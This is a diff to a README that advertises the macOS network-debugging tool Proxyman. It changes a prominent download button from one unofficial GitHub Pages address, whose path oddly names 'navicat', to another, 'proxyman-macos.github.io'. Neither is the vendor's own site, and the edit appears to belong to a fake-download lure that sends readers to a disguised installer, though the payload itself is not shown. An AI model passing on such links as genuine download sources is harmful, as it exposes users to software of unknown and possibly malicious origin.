@@ -85,7 +85,7 @@ Proxyman is optimized for **macOS** and works on any machine running **macOS 10.
 Proxyman is available for download on **macOS**. Whether you are working on an existing project or starting a new one, Proxyman will help you debug your network traffic with ease.
 
 <div align="center">
-  <a href="https://junimata-orex.github.io/.github/navicat">
+  <a href="https://proxyman-macos.github.io/.github">
     <img src="https://img.shields.io/badge/⬇️_Download_Proxyman-4CAF50?style=for-the-badge&logo=apple&logoColor=white" alt="Download Proxyman">
   </a>
 </div>
